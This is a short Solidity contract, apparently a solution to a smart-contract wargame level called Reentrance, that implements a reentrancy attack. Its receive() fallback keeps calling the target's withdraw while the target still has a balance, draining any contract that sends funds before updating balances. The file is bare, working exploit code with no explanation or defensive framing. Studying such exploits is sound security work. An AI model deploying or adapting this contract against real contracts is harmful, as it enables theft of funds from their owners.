// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

interface IReentrance {
    function donate(address _to) payable external;
    function withdraw(uint _amount) external;
}

contract Reentry {
    address reentrance;

    constructor(address reentranceContract) {
        reentrance = reentranceContract;
    }

    function donate(address _to) public payable {
        IReentrance(reentrance).donate(_to);
    }

    function withdraw(uint _amount) public {
        IReentrance(reentrance).withdraw(_amount);
    }

    receive() payable external {
        if (reentrance.balance > 0) {
            IReentrance(reentrance).withdraw(msg.value);
        }
    }
}